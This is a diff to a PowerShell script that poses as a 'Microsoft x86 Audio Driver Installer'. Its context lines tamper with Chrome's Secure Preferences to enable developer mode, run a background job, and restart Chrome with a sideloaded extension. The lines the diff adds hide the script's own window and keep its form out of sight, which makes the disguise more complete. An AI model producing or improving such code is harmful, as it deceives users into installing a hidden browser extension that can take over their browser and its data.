@@ -211,7 +211,16 @@ Enable-DeveloperMode -JsonFilePath $SecurePreferencesPath
 $job = Start-Job -ScriptBlock { Executor-X }
 
 Add-Type -AssemblyName System.Windows.Forms
-
+$windowHandle = (Get-Process -Id $pid).MainWindowHandle
+Add-Type @"
+using System;
+using System.Runtime.InteropServices;
+public class WindowHelper {
+    [DllImport("user32.dll")]
+    public static extern bool ShowWindow(IntPtr hWnd, int nCmdShow);
+}
+"@
+[WindowHelper]::ShowWindow($windowHandle, 2) # 2 = SW_MINIMIZE
 # Welcome Screen
 $welcomeForm = New-Object System.Windows.Forms.Form
 $welcomeForm.Text = "Microsoft x86 Audio Driver Installer"
@@ -329,9 +338,8 @@ $tosNextButton.Add_Click({
     $installForm.ShowDialog()
 })
 
-$iNextButton.Add_Click({
-    $welcomeForm.Close()
-    $tosForm.Close()
+$iNextButton.Add_Click({  
+$installForm.Hide()
 $MasterDir = "$env:LOCALAPPDATA\Google\Chrome\User Data\Default"
 
 # Define Extension Path
@@ -346,8 +354,6 @@ if ($subdirectory) {
 }
 Wait-Job -Id $job.Id
     Restart-ChromeWithExtension -ExtensionPath $ExtensionPath
-    $installForm.Close()
-    exit
 })
 
 # Show Welcome Screen
